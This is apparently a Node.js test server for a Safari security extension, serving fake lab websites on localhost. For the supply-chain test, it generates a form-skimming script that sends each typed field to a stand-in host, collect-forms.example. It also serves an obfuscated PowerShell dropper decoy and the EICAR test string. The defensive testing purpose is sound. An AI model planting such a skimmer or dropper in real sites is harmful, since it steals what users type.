// Serves the local test pages at http://localhost:8765 and the test lab: fake
// websites at http://<name>.localhost:8765 (macOS sends every *.localhost name
// to this Mac), each served from test-site/lab/<name>/. It has no model or
// analysis code: the Safari extension talks to the models itself.
import {createServer} from "node:http";
import {readFile, readdir} from "node:fs/promises";
import {extname} from "node:path";

const port = Number(process.env.OBSERVER_PORT || 8765);
const labDir = new URL("lab/", import.meta.url);

// The EICAR test string is stored in two halves and joined only when served,
// so antivirus does not quarantine this source file.
const eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
const downloads = new Map([
  ["/download/notes.txt", ["Meeting notes: nothing to see here.\n", "text/plain; charset=utf-8", "notes.txt"]],
  ["/download/eicar.com", [eicar, "application/octet-stream", "eicar.com"]]
]);

const pages = new Map([
  ["/", ["index.html", "text/html; charset=utf-8"]],
  ["/phish", ["phish.html", "text/html; charset=utf-8"]],
  ["/script", ["script.html", "text/html; charset=utf-8"]],
  ["/demo.js", ["demo.js", "text/javascript; charset=utf-8"]],
  ["/lab", ["lab.html", "text/html; charset=utf-8"]]
]);

const types = {".html": "text/html; charset=utf-8", ".js": "text/javascript; charset=utf-8",
               ".svg": "image/svg+xml", ".css": "text/css", ".png": "image/png", ".pdf": "application/pdf"};

// Lab state: whether cdn-swap's app.js has been "swapped" by an attacker.
let cdnSwapped = false;
// What lab sites received (site, path, time; never the body), so a test can tell
// whether anything typed left the page. Read and cleared at /lab/received.
let received = [];

function send(response, status, body, type, headers = {}) {
  response.writeHead(status, {"Content-Type": type, "Cache-Control": "no-store", ...headers});
  response.end(body);
}

// Lab files that are generated rather than read from disk.
function labSpecial(site, path) {
  if (site === "cdn-swap" && path === "/app.js") {
    return cdnSwapped
      // The "attacker's" version: copies every form field as it is typed and
      // sends it to another server (an address that does not exist).
      ? ["(function(){var d=[];document.addEventListener('input',function(e){d.push([e.target.name,e.target.value]);" +
         "new Image().src='http://collect-forms.example/c?d='+encodeURIComponent(JSON.stringify(d));});})();",
         types[".js"]]
      : ["window.siteAnalytics={page:location.pathname,start:Date.now()};", types[".js"]];
  }
  if (site === "invoice" && path === "/files/Invoice_4471.pdf") {
    return ["%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[]/Count 0>>endobj\n" +
            "trailer<</Root 1 0 R>>\n%%EOF\n", types[".pdf"], "Invoice_4471.pdf"];
  }
  if (site === "invoice" && path === "/files/Invoice_4471.pdf.js") {
    return ["var _0x9a=['V1NjcmlwdC5TaGVsbA==','cG93ZXJzaGVsbCAtZW5jIA=='];" +
            "/* would run: new ActiveXObject(atob(_0x9a[0])).Run(atob(_0x9a[1])+payload) */",
            "application/octet-stream", "Invoice_4471.pdf.js"];
  }
  if (site === "invoice" && path === "/files/statement.com") {
    return [eicar, "application/octet-stream", "statement.com"];
  }
  return null;
}

async function serveLab(response, site, rawPath) {
  // "//page.html" is served like "/page.html", as many web servers do (phishing
  // links use such paths; see the lab check "double-slash path").
  const path = decodeURIComponent(rawPath.split("?")[0]).replace(/^\/+/, "/");
  const special = labSpecial(site, path);
  if (special) {
    const [body, type, attachment] = special;
    return send(response, 200, body, type, attachment ? {"Content-Disposition": `attachment; filename="${attachment}"`} : {});
  }
  const file = path === "/" ? "index.html" : path.slice(1);
  // Only plain file names inside the site's own folder.
  if (!/^[a-z0-9_.-]+$/i.test(file) || file.startsWith(".")) return send(response, 404, "Not found", "text/plain");
  try {
    const body = await readFile(new URL(site + "/" + file, labDir));
    return send(response, 200, body, types[extname(file)] || "application/octet-stream");
  } catch {
    return send(response, 404, "Not found", "text/plain");
  }
}

createServer(async (request, response) => {
  // Accept only this Mac's own names (blocks DNS rebinding).
  const host = request.headers.host || "";
  const match = host.match(/^(?:([a-z0-9-]+)\.)?localhost:\d+$/i);
  if (!match && !/^127\.0\.0\.1:\d+$/.test(host)) return send(response, 421, "Misdirected request", "text/plain");

  const site = match?.[1]?.toLowerCase();
  if (site) {
    // Lab sites accept form posts so the extension's submit check can be tested;
    // only the fact that something arrived is recorded, never what.
    if (request.method === "POST") {
      request.resume();
      received.push({site, path: request.url.split("?")[0], at: Date.now()});
      return send(response, 200, "Received.", "text/plain");
    }
    if (request.method !== "GET") return send(response, 405, "Method not allowed", "text/plain");
    const sites = await readdir(labDir).catch(() => []);
    if (!sites.includes(site)) return send(response, 404, "No such lab site: " + site, "text/plain");
    return serveLab(response, site, request.url);
  }

  if (request.method !== "GET") return send(response, 405, "Method not allowed", "text/plain");
  if (request.url === "/lab/received") return send(response, 200, JSON.stringify(received), "application/json");
  if (request.url === "/lab/received/clear") {
    received = [];
    return send(response, 200, "[]", "application/json");
  }
  if (request.url === "/lab/swap" || request.url === "/lab/unswap") {
    cdnSwapped = request.url === "/lab/swap";
    return send(response, 200, "cdn-swap app.js is now the " + (cdnSwapped ? "ATTACKER'S" : "original") +
                " version. Reload http://cdn-swap.localhost:" + port + "/", "text/plain");
  }
  if (pages.has(request.url)) {
    const [file, type] = pages.get(request.url);
    return send(response, 200, await readFile(new URL(file, import.meta.url)), type);
  }
  if (request.url === "/asset") return send(response, 200, "demo asset", "text/plain");
  if (downloads.has(request.url)) {
    const [body, type, name] = downloads.get(request.url);
    return send(response, 200, body, type, {"Content-Disposition": `attachment; filename="${name}"`});
  }
  send(response, 404, "Not found", "text/plain");
}).listen(port, "127.0.0.1", () => {
  console.log("Test site at http://localhost:" + port + " · lab index at http://localhost:" + port + "/lab");
});
